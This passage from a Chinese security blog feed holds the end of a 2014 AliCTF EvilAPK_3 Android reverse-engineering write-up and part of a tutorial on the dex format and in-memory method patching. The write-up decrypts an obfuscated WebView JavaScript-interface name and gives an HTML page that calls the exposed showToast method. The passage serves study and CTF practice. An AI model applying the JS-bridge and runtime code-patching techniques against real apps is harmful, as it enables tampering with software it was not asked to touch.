ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());            String v1 = MainActivity.this.edit.getText().toString(); // 获取EditText中的字符串            Intent v0 = new Intent();            v0.putExtra(ListViewAutoScrollHelpern.decrypt_native(&quot;dV.&quot;, 2), v1); // 将v1的值传给Intent，变量名为“dV.”解密后的值            v0.setClass(MainActivity.this, WebViewActivity.class); // 设置Intent要跳转的类为WebViewActivity            MainActivity.this.startActivity(v0); // 启动WebViewActivity        }    }    Button btn_enter;    View$OnClickListener btn_listener;    EditText edit;    public MainActivity() {        super();        this.btn_enter = null;        this.edit = null;        this.btn_listener = new com.ali.tg.testapp.MainActivity$1(this);    }    protected void onCreate(Bundle arg4) {        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());        super.onCreate(arg4);        this.setContentView(0x7F030000);        this.edit = this.findViewById(0x7F060001);        this.btn_enter = this.findViewById(0x7F060002);        this.btn_enter.setOnClickListener(this.btn_listener);    }}</code></pre><p>然后来看看 WebViewActivity，主要就是新建了一个 JavaScriptInterface 对象，对象的名称同样被加密了。然后加载输入的 url，目标是最后能够成功调用对象 JavaScriptInterface 里的 showToast 方法。接下来需要根据密文解出对象名，并构造出相应的网页来弹出 Toast。不过这里好像 flag 就是“祥龙”，但还是继续往下尝试构造出能够弹 Toast 的方法：</p><pre><code class="java">package com.ali.tg.testapp;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.webkit.WebSettings;import android.webkit.WebView;import android.widget.Toast;public class WebViewActivity extends Activity {    public class JavaScriptInterface {        Context mContext;        JavaScriptInterface(WebViewActivity arg1, Context arg2) {            WebViewActivity.this = arg1;            super();            this.mContext = arg2;        }        public void showToast() { // 构造出一个页面能够调用这个函数就成功了            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());            Toast.makeText(this.mContext, &quot;祥龙！&quot;, 0).show();        }    }    WebView wView;    public WebViewActivity() {        super();        this.wView = null;    }    protected void onCreate(Bundle arg7) {        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());        super.onCreate(arg7);        this.setContentView(0x7F030001);        this.wView = this.findViewById(0x7F060004);        WebSettings v2 = this.wView.getSettings();        v2.setJavaScriptEnabled(true);        v2.setJavaScriptCanOpenWindowsAutomatically(true);        this.wView.addJavascriptInterface(new JavaScriptInterface(this, ((Context)this)), ListViewAutoScrollHelpern.decrypt_native(&quot;BQ1$*[w6G_&quot;, 2)); // 添加一个JavascriptInterface对象，对象的变量名为“BQ1$*[w6G_”解密后的值        this.wView.loadUrl(this.getIntent().getStringExtra(ListViewAutoScrollHelpern.decrypt_native(&quot;dV.&quot;, 2))); // 把在MainActivity中获取的变量作为url来加载    }}</code></pre><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><p>接下来再看看 ListViewAutoScrollHelpern 中的 decrypt_native 方法，发现是在 Native 层中的 translate 库实现的：</p><pre><code class="java">package android.support.v4.widget;import android.util.Log;public class ListViewAutoScrollHelpern {    static {        System.loadLibrary(&quot;translate&quot;);    }    public ListViewAutoScrollHelpern() {        super();    }    public static native String decrypt_native(String arg0, int arg1) {    }    public static void testLogv(String arg1) {        Log.v(&quot;cheatecore&quot;, arg1);    }    public static void testLogw(String arg1) {        Log.w(&quot;cheatecore&quot;, arg1);    }}</code></pre><p>然后将 libtranslat.so 载入 IDA。先看看 JNI_OnLoad，其中有两个函数 register_Algorithm 和 register_translate：</p><pre><code class="cpp">int __fastcall JNI_OnLoad(_JavaVM *a1){  int v1; // r1  jint v2; // r2  _JNIEnv *v3; // r4  jint v4; // r0  bool v5; // cf  int result; // r0  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;env, 65540) )    return -1;  v3 = env;  register_Algorithm(env, v1, v2);  v4 = register_translate(v3);  v5 = v4 &lt; 0;  result = v4 &amp; (v4 &gt;&gt; 32);  if ( !v5 )    result = 65540;  return result;}</code></pre><p>在 register_Algorithm 中发现了目标函数：</p><pre><code class="cpp">int __fastcall register_Algorithm(_JNIEnv *a1, int a2, jint a3){  _JNIEnv *v3; // r4  jclass v4; // r0  jclass v5; // r0  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;android/support/v4/widget/ListViewAutoScrollHelpern&quot;);  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v4, (const JNINativeMethod *)off_607C, 1);  v5 = v3-&gt;functions-&gt;FindClass(&amp;v3-&gt;functions, &quot;android/support/v4/view/PagerTitleStripIcsn&quot;);  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v5, (const JNINativeMethod *)off_607C, 1);  return 0;}</code></pre><p>定位到目标函数，发现其中调用了一个 vigenere_decrypt：</p><pre><code class="cpp">jstring __fastcall decrypt_native(_JNIEnv *a1, jobject a2, jstring a3, jint a4){  jstring data; // r6  jint num; // r9  _JNIEnv *env; // r4  const char *v7; // r0  const char *v8; // r8  jstring v9; // r7  int v11; // [sp+4h] [bp+0h]  data = a3;  num = a4;  env = a1;  memset(&amp;v11, 0, 0x1000u);  v7 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, data, 0);  v8 = v7;  if ( num == 2 )  {    vigenere_decrypt(v7, (char *)&amp;v11);    v9 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, (const char *)&amp;v11);  }  else  {    v9 = data;  }  env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, data, v8);  return v9;}</code></pre><p>在 vigenere_decrypt 函数中，对输入的数据进行了解密：</p><pre><code class="cpp">signed int __fastcall vigenere_decrypt(const char *ciphertext, char *plaintext){  const char *ciphertext_1; // r8  char *plaintext_1; // r6  size_t len; // r0  char *v5; // r2  const char *table; // r3  signed int v7; // r7  int v8; // r0  int v9; // r1  int v10; // r5  int v11; // r0  int v12; // r10  char v13; // r3  signed int i; // r5  signed int result; // r0  signed int v16; // r9  int ch; // r3  char s; // [sp+4h] [bp-64h]  char v19; // [sp+48h] [bp-20h]  ciphertext_1 = ciphertext;  plaintext_1 = plaintext;  len = strlen(ciphertext);  v5 = &amp;s;  table = &quot;ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU&quot;;  v7 = len;  do  {    v8 = *(_DWORD *)table;    table += 8;    v9 = *((_DWORD *)table - 1);    *(_DWORD *)v5 = v8;    *((_DWORD *)v5 + 1) = v9;    v10 = (int)(v5 + 8);    v5 += 8;  }  while ( table != &quot;tCQU&quot; );  v11 = *(_DWORD *)table;  v12 = 0;  v13 = table[4];  *(_DWORD *)v10 = v11;  *(_BYTE *)(v10 + 4) = v13;  i = 0;  result = strlen(&amp;s);  v16 = result;  while ( i &lt; v7 )  {    ch = (unsigned __int8)ciphertext_1[i];    if ( ch - 32 &lt;= (unsigned int)&#39;^&#39; )         // chr(ch) &lt;= 127    {      plaintext_1[i] = (ch - (unsigned __int8)*(&amp;v19 + v12 - 68) + 95) % 95 + 32;// &amp;v19 - 68 = &amp;table      result = (v12 + 1) / v16;      v12 = (v12 + 1) % v16;    }    else                                        // chr(ch) &gt; 127    {      plaintext_1[i] = ch;    }    ++i;  }  return result;}</code></pre><p>我先是通过动态调试来获取到了两个字符串的解密结果：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2014-AliCTF-EvilAPK_3/6.png" srcset="/img/loading.gif" alt></p><p>然后尝试自己实现一个解密函数进行验证：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char *table = &quot;ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU&quot;;char *vigenere_decrypt(char *ciphertext) {    int j = 0;    int len = strlen(ciphertext);    printf(&quot;%d\n&quot;, len);    char plaintext[len];    for (int i = 0; i &lt; len; i++) {        char ch = ciphertext[i];        if ((ch - 32) &lt;= 0x5E) {            plaintext[i] = (ch - table[j] + 95) % 95 + 32;            j = (j + 1) % 16;        } else {            plaintext[i] = ch;        }    }    plaintext[len] = &#39;\x00&#39;;    return plaintext;}int main() {    char *ciphertext1 = &quot;dV.&quot;;    char *plaintext1 = vigenere_decrypt(ciphertext1);    printf(&quot;%s\n&quot;, plaintext1); // url    char *ciphertext2 = &quot;BQ1$*[w6G_&quot;;    char *plaintext2 = vigenere_decrypt(ciphertext2);    printf(&quot;%s\n&quot;, plaintext2); // SmokeyBear    return 0;}</code></pre><p>当然这里也可以 Hook 这个 so 文件，也可以直接编写代码调用 so 中的函数，条条大路通罗马。最后实现一个调用 Toast 的 html 页面：</p><pre><code class="html">&lt;html&gt;  &lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      function alicrack() {        SmokeyBear.showToast();      }    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    Crack EvilAPK_3    &lt;script type=&quot;text/javascript&quot;&gt;      alicrack();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>在软件中输入对应的地址，成功弹窗：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/7.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/383" target="_blank" rel="noopener">https://xz.aliyun.com/t/383</a><br><a href="https://blog.csdn.net/AliMobileSecurity/article/details/53259788" target="_blank" rel="noopener">https://blog.csdn.net/AliMobileSecurity/article/details/53259788</a><br><a href="https://yq.aliyun.com/articles/64691" target="_blank" rel="noopener">https://yq.aliyun.com/articles/64691</a><br><a href="http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（四）</title>
    <link href="blog.b3ale.cn/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-02-14T06:21:40.000Z</published>
    <updated>2020-03-20T01:26:41.632Z</updated>
    
    <content type="html"><![CDATA[<p>Android 加壳和脱壳入门。</p><a id="more"></a><h1 id="dex-文件格式"><a href="#dex-文件格式" class="headerlink" title="dex 文件格式"></a>dex 文件格式</h1><p>Android 程序编译以后生成 apk 文件，里面的 classes.dex 文件存放着程序运行的字节码，dex 文件是可以直接在 Dalvik 虚拟机中加载运行的文件。由于 Dalvik 是一种针对嵌入式设备而特殊设计的 Java 虚拟机，所以 dex 文件与标准的 class 文件在结构设计上有着本质的区别。当 Java 程序编译成 class 后，还需要使用 dx 工具将所有的 class 文件整合到一个 dex 文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，dex 文件是传统 jar 文件大小的 50% 左右。要想手工脱壳，必须先了解 dex 的文件格式。</p><p><img src="/pics/Android逆向入门/四/1.png" srcset="/img/loading.gif" alt></p><p>ShakaApktool 使用 bs 命令即可对 class.dex 实现反编译回 smali 文件字节码，而使用 s 命令可以把 smali 字节码编译为 class.dex 文件：</p><pre><code class="bash">java -jar ShakaApktool bs classes.dex -o smali-dirjava -jar ShakaApktool s smali-dir -o example.dex</code></pre><p>dex 文件的数据结构大概如下：</p><table><thead><tr><th style="text-align:center">数据名称</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">header</td><td style="text-align:center">dex 文件头部，记录整个 dex 文件的相关属性</td></tr><tr><td style="text-align:center">string_ids</td><td style="text-align:center">字符串数据索引，记录了每个字符串在数据区的偏移量</td></tr><tr><td style="text-align:center">type_ids</td><td style="text-align:center">类似数据索引，记录了每个类型的字符串索引</td></tr><tr><td style="text-align:center">proto_ids</td><td style="text-align:center">原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表</td></tr><tr><td style="text-align:center">field_ids</td><td style="text-align:center">字段数据索引，记录了所属类，类型以及方法名</td></tr><tr><td style="text-align:center">method_ids</td><td style="text-align:center">类方法索引，记录方法所属类名，方法声明以及方法名等信息</td></tr><tr><td style="text-align:center">class_defs</td><td style="text-align:center">类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">数据区，保存了各个类的真是数据</td></tr><tr><td style="text-align:center">link_data</td><td style="text-align:center">连接数据区</td></tr></tbody></table><p>这里先看一下 Android 源码，首先在 <a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Common.h" target="_blank" rel="noopener">/dalvik/vm/Common.h</a> 中对数据类型有一个重命名：</p><pre><code class="cpp">/* * These match the definitions in the VM specification. */typedef uint8_t             u1;typedef uint16_t            u2;typedef uint32_t            u4;typedef uint64_t            u8;typedef int8_t              s1;typedef int16_t             s2;typedef int32_t             s4;typedef int64_t             s8;</code></pre><p>所有 dex 文件相关的数据结构都在 <a href="http://androidxref.com/4.1.1/xref/dalvik/libdex/DexFile.h" target="_blank" rel="noopener">/dalvik/libdex/DexFile.h</a> 中。dex 文件的结构如下：</p><pre><code class="cpp">/* * Structure representing a DEX file. * * Code should regard DexFile as opaque, using the API calls provided here * to access specific structures. */struct DexFile {    /* directly-mapped &quot;opt&quot; header */    const DexOptHeader* pOptHeader;    /* pointers to directly-mapped structs and arrays in base DEX */    const DexHeader*    pHeader;    const DexStringId*  pStringIds;    const DexTypeId*    pTypeIds;    const DexFieldId*   pFieldIds;    const DexMethodId*  pMethodIds;    const DexProtoId*   pProtoIds;    const DexClassDef*  pClassDefs;    const DexLink*      pLinkData;    /*     * These are mapped out of the &quot;auxillary&quot; section, and may not be     * included in the file.     */    const DexClassLookup* pClassLookup;    const void*         pRegisterMapPool;       // RegisterMapClassPool    /* points to start of DEX file data */    const u1*           baseAddr;    /* track memory overhead for auxillary structures */    int                 overhead;    /* additional app-specific data structures associated with the DEX */    //void*               auxData;};</code></pre><p>dex 文件结构分别为文件头、索引区和数据区：</p><p><img src="/pics/Android逆向入门/四/2.png" srcset="/img/loading.gif" alt></p><h2 id="dex-文件头"><a href="#dex-文件头" class="headerlink" title="dex 文件头"></a>dex 文件头</h2><p>文件头中简单记录了 dex 文件的一些基本信息，以及大致的数据分布。长度固定为 0x70，其中每一项信息所占用的内存空间也是固定的，好处是虚拟机在处理 dex 时不用考虑 dex 文件的多样性：</p><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">偏移值</th><th style="text-align:center">长度</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">magic</td><td style="text-align:center">0x00</td><td style="text-align:center">8</td><td style="text-align:center">魔数字段，值为”dex\n035\0”</td></tr><tr><td style="text-align:center">checksum</td><td style="text-align:center">0x08</td><td style="text-align:center">4</td><td style="text-align:center">校验码</td></tr><tr><td style="text-align:center">signature</td><td style="text-align:center">0x0c</td><td style="text-align:center">20</td><td style="text-align:center">sha-1 签名</td></tr><tr><td style="text-align:center">file_size</td><td style="text-align:center">0x20</td><td style="text-align:center">4</td><td style="text-align:center">dex 文件总长度</td></tr><tr><td style="text-align:center">header_size</td><td style="text-align:center">0x24</td><td style="text-align:center">4</td><td style="text-align:center">文件头长度，009 版本=0x5c,035 版本=0x70</td></tr><tr><td style="text-align:center">endian_tag</td><td style="text-align:center">0x28</td><td style="text-align:center">4</td><td style="text-align:center">标示字节顺序的常量</td></tr><tr><td style="text-align:center">link_size</td><td style="text-align:center">0x2c</td><td style="text-align:center">4</td><td style="text-align:center">链接段的大小，如果为 0 就是静态链接</td></tr><tr><td style="text-align:center">link_off</td><td style="text-align:center">0x30</td><td style="text-align:center">4</td><td style="text-align:center">链接段的开始位置</td></tr><tr><td style="text-align:center">map_off</td><td style="text-align:center">0x34</td><td style="text-align:center">4</td><td style="text-align:center">map 数据基址</td></tr><tr><td style="text-align:center">string_ids_size</td><td style="text-align:center">0x38</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表中字符串个数</td></tr><tr><td style="text-align:center">string_ids_off</td><td style="text-align:center">0x3c</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表基址</td></tr><tr><td style="text-align:center">type_ids_size</td><td style="text-align:center">0x40</td><td style="text-align:center">4</td><td style="text-align:center">类列表里的类型个数</td></tr><tr><td style="text-align:center">type_ids_off</td><td style="text-align:center">0x44</td><td style="text-align:center">4</td><td style="text-align:center">类列表基址</td></tr><tr><td style="text-align:center">proto_ids_size</td><td style="text-align:center">0x48</td><td style="text-align:center">4</td><td style="text-align:center">原型列表里面的原型个数</td></tr><tr><td style="text-align:center">proto_ids_off</td><td style="text-align:center">0x4c</td><td style="text-align:center">4</td><td style="text-align:center">原型列表基址</td></tr><tr><td style="text-align:center">field_ids_size</td><td style="text-align:center">0x50</td><td style="text-align:center">4</td><td style="text-align:center">字段个数</td></tr><tr><td style="text-align:center">field_ids_off</td><td style="text-align:center">0x54</td><td style="text-align:center">4</td><td style="text-align:center">字段列表基址</td></tr><tr><td style="text-align:center">method_ids_size</td><td style="text-align:center">0x58</td><td style="text-align:center">4</td><td style="text-align:center">方法个数</td></tr><tr><td style="text-align:center">method_ids_off</td><td style="text-align:center">0x5c</td><td style="text-align:center">4</td><td style="text-align:center">方法列表基址</td></tr><tr><td style="text-align:center">class_defs_size</td><td style="text-align:center">0x60</td><td style="text-align:center">4</td><td style="text-align:center">类定义标中类的个数</td></tr><tr><td style="text-align:center">class_defs_off</td><td style="text-align:center">0x64</td><td style="text-align:center">4</td><td style="text-align:center">类定义列表基址</td></tr><tr><td style="text-align:center">data_size</td><td style="text-align:center">0x68</td><td style="text-align:center">4</td><td style="text-align:center">数据段的大小，必须 4k 对齐</td></tr><tr><td style="text-align:center">data_off</td><td style="text-align:center">0x6c</td><td style="text-align:center">4</td><td style="text-align:center">数据段基址</td></tr></tbody></table><p>文件头的数据结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;header_item&quot; struct. */struct DexHeader {    u1  magic[8];           /* includes version number */    u4  checksum;           /* adler32 checksum */    u1  signature[kSHA1DigestLen]; /* SHA-1 hash */    u4  fileSize;           /* length of entire file */    u4  headerSize;         /* offset to start of next section */    u4  endianTag;    u4  linkSize;    u4  linkOff;    u4  mapOff;    u4  stringIdsSize;    u4  stringIdsOff;    u4  typeIdsSize;    u4  typeIdsOff;    u4  protoIdsSize;    u4  protoIdsOff;    u4  fieldIdsSize;    u4  fieldIdsOff;    u4  methodIdsSize;    u4  methodIdsOff;    u4  classDefsSize;    u4  classDefsOff;    u4  dataSize;    u4  dataOff;};</code></pre><h2 id="索引区"><a href="#索引区" class="headerlink" title="索引区"></a>索引区</h2><p>索引区包括 string_ids、type_ids、proto_ids、field_ids、method_ids 几个数据结构。数组结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;string_id_item&quot;. */struct DexStringId {    u4 stringDataOff;      /* file offset to string_data_item */};/* * Direct-mapped &quot;type_id_item&quot;. */struct DexTypeId {    u4  descriptorIdx;      /* index into stringIds list for type descriptor */};/* * Direct-mapped &quot;field_id_item&quot;. */struct DexFieldId {    u2  classIdx;           /* index into typeIds list for defining class */    u2  typeIdx;            /* index into typeIds for field type */    u4  nameIdx;            /* index into stringIds for field name */};/* * Direct-mapped &quot;method_id_item&quot;. */struct DexMethodId {    u2  classIdx;           /* index into typeIds list for defining class */    u2  protoIdx;           /* index into protoIds for method prototype */    u4  nameIdx;            /* index into stringIds for method name */};/* * Direct-mapped &quot;proto_id_item&quot;. */struct DexProtoId {    u4  shortyIdx;          /* index into stringIds for shorty descriptor */    u4  returnTypeIdx;      /* index into typeIds list for return type */    u4  parametersOff;      /* file offset to type_list for parameter types */};</code></pre><h2 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h2><p>数据段包括 class_defs、data、link_data，数据结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;map_item&quot;. */struct DexMapItem {    u2 type;              /* type code (see kDexType* above) */    u2 unused;    u4 size;              /* count of items of the indicated type */    u4 offset;            /* file offset to the start of data */};/* * Direct-mapped &quot;map_list&quot;. */struct DexMapList {    u4  size;               /* #of entries in list */    DexMapItem list[1];     /* entries */};/* * Direct-mapped &quot;class_def_item&quot;. */struct DexClassDef {    u4  classIdx;           /* index into typeIds for this class */    u4  accessFlags;    u4  superclassIdx;      /* index into typeIds for superclass */    u4  interfacesOff;      /* file offset to DexTypeList */    u4  sourceFileIdx;      /* index into stringIds for source file name */    u4  annotationsOff;     /* file offset to annotations_directory_item */    u4  classDataOff;       /* file offset to class_data_item */    u4  staticValuesOff;    /* file offset to DexEncodedArray */};/* * Link table.  Currently undefined. */struct DexLink {    u1  bleargh;};</code></pre><h1 id="动态代码自修改（加壳原理）"><a href="#动态代码自修改（加壳原理）" class="headerlink" title="动态代码自修改（加壳原理）"></a>动态代码自修改（加壳原理）</h1><p>DexClassDef -&gt; DexClassData -&gt; DexMethod -&gt; DexCode -&gt; insns</p><pre><code class="cpp">/* * Direct-mapped &quot;code_item&quot;. * * The &quot;catches&quot; table is used when throwing an exception, * &quot;debugInfo&quot; is used when displaying an exception stack trace or * debugging. An offset of zero indicates that there are no entries. */struct DexCode {    u2  registersSize;      // 使用的寄存器个数    u2  insSize;            // 参数个数    u2  outsSize;           // 调用其他方法时使用的寄存器个数    u2  triesSize;          // Try/Catch的个数    u4  debugInfoOff;       // 指令调试信息的偏移 /* file offset to debug info stream */    u4  insnsSize;          // 指令集个数，以2字节为单位 /* size of the insns array, in u2 units */    u2  insns[1];           // 指令集    /* followed by optional u2 padding */    /* followed by try_item[triesSize] */    /* followed by uleb128 handlersSize */    /* followed by catch_handler_item[handlersSize] */};</code></pre><p>其中，insns 的值是用于存放程序实现代码的地方。程序执行的时候会把整个 dex 文件加载到内存之中，然后动态地解析执行 insns 中的内容。只要修改了里面的数据，就相当于修改了程序执行流程。</p><h2 id="修改-insns"><a href="#修改-insns" class="headerlink" title="修改 insns"></a>修改 insns</h2><h3 id="直接在内存中修改"><a href="#直接在内存中修改" class="headerlink" title="直接在内存中修改"></a>直接在内存中修改</h3><ol><li>定位到 dex 文件</li><li>计算函数的 DexCode 位置</li><li>重写 DexCode 的 insns 数据</li></ol><h4 id="JNI-Bridge"><a href="#JNI-Bridge" class="headerlink" title="JNI Bridge"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Jni.cpp" target="_blank" rel="noopener">JNI Bridge</a></h4><p>JNI 提供了让我们在 C++代码层中直接操作 Dalvik（Java）数据的接口，可以直接在 JNI 中操作相关数据来修改 Android 中的代码。</p><h4 id="Object-结构体"><a href="#Object-结构体" class="headerlink" title="Object 结构体"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/oo/Object.cpp" target="_blank" rel="noopener">Object 结构体</a></h4><p>Android 运行时，解析 dex 文件，并生成相关的结构体：<a href="http://androidxref.com/4.1.1/xref/dalvik/vm/DvmDex.cpp" target="_blank" rel="noopener">DvmDex</a>。其中存储了各种字符串、类、方法等信息。加载的时候，调用 <code>dvmDexFileOpenPartial</code> 对 dex 文件进行解析，并转化为可执行的结构体，这也是这个函数可以作为脱壳用的函数的原因之一。（以前的爱加密可以直接通过 Hook 这个函数进行脱壳）。</p><p>其中 Method 结构体是根据 DexMethod 生成的执行方法类。Dalvik 执行代码时，都是从 Method 中取出代码来执行的。因此可以直接通过操作 Method 结构体来修改执行的代码。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>首先新建一个 JNI 项目，并新建两个函数 <code>ret1()</code> 和 <code>ret2()</code> 函数，以及一个 Native 函数 <code>changeMethod()</code>：</p><pre><code class="java">package com.assassinq.editdexfile;import android.os.Bundle;import com.google.android.material.floatingactionbutton.FloatingActionButton;import androidx.appcompat.app.AppCompatActivity;import androidx.appcompat.widget.Toolbar;import android.util.Log;import android.view.View;import android.view.Menu;import android.view.MenuItem;import java.lang.reflect.Method;public class MainActivity extends AppCompatActivity {    static {        System.loadLibrary(&quot;hello&quot;);    }    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        Toolbar toolbar = findViewById(R.id.toolbar);        setSupportActionBar(toolbar);        FloatingActionButton fab = findViewById(R.id.fab);        fab.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                try {                    Method m = MainActivity.class.getMethod(&quot;ret1&quot;);                    Log.d(&quot;DEBUG&quot;, &quot;Return Value = &quot; + ret1());                    changeMethod(m);                    Log.d(&quot;DEBUG&quot;, &quot;Return Value = &quot; + ret1());                } catch (Exception e) {//                    e.printStackTrace();                    Log.d(&quot;EXCEPTION&quot;, Log.getStackTraceString(e));                }            }        });    }    @Override    public boolean onCreateOptionsMenu(Menu menu) {        // Inflate the menu; this adds items to the action bar if it is present.        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }    @Override    public boolean onOptionsItemSelected(MenuItem item) {        // Handle action bar item clicks here. The action bar will        // automatically handle clicks on the Home/Up button, so long        // as you specify a parent activity in AndroidManifest.xml.        int id = item.getItemId();        //noinspection SimplifiableIfStatement        if (id == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }    public int ret1() {        return 1;    }    public int ret2() {        return 2;    }    // public native void changeMethod(Method r1);}</code></pre><p>先编译生成一个不包含 JNI 的 apk，解压后取出其中的 classes.dex，然后在 010 Editor 中用 DEX Template 解析，找到 DexCode 中的 insns，并记录下 <code>ret1()</code> 和 <code>ret2()</code> 的字节码：</p><p><img src="/pics/Android逆向入门/四/3.png" srcset="/img/loading.gif" alt></p><p>然后完善 JNI 函数，并且需要导入 Android 源码中 Dalvik 文件夹下相关的头文件。JNI 实现如下，将 <code>ret1()</code> 所指向的字节码修改为 <code>ret2()</code> 的字节码：</p><pre><code class="cpp">#include &lt;jni.h&gt;#include &lt;string.h&gt;#include &lt;android/log.h&gt;#include &quot;Object.h&quot;#include &quot;Common.h&quot;#ifdef LOG_TAG#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endifconst char insns[] = {0x12, 0x20, 0x0F, 0x00};void changeMethod(JNIEnv *env, jobject obj, jobject method) {    /*     * 12 10 0F 00 -&gt; ret 1     * 12 20 0F 00 -&gt; ret 2     */    Method *pMethod = (Method *) env-&gt;FromReflectedMethod(method);    pMethod-&gt;insns = (const u2*) insns;}static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods,                                 int numMethods) {    jclass clazz;    clazz = env-&gt;FindClass(className);    if (clazz == NULL) {        return JNI_FALSE;    }    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) {        return JNI_FALSE;    }    return JNI_TRUE;}static const char *gClassName = &quot;com/assassinq/editdexfile/MainActivity&quot;;static JNINativeMethod gMethods[] = {        {&quot;changeMethod&quot;, &quot;(Ljava/lang/reflect/Method;)V&quot;, (void *) changeMethod},};JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {    JNIEnv *env = NULL;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) {        LOGE(&quot;This jni version is not supported&quot;);        return -1;    }    if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) ==        JNI_FALSE) {        LOGE(&quot;Unable to register native methods&quot;);        return -1;    }    LOGE(&quot;Methods loaded successfully&quot;);    return JNI_VERSION_1_6;}</code></pre><p>运行程序并点击触发事件，查看日志发现修改生效：</p><pre><code class="log">02-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 102-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 2</code></pre><h3 id="IDA-中动态修改"><a href="#IDA-中动态修改" class="headerlink" title="IDA 中动态修改"></a>IDA 中动态修改</h3><ol><li>Ctrl+s 打开 map 数据</li><li>查找内存加载的额 classes.dex 的位置</li><li>直接计算偏移，修改相应的位置</li></ol><h3 id="内存修改的另一种方法"><a href="#内存修改的另一种方法" class="headerlink" title="内存修改的另一种方法"></a>内存修改的另一种方法</h3><p>修改方法定位：dexClassDef 遍历以获取 MethodId，对比 MethodName 与 proto 以获取目标 Method，然后对相应的 DexCode 进行修改。由于 Dex 加载到内存中是只有只读权限，故需要先修改内存页的权限才能正常地修改 DexCode 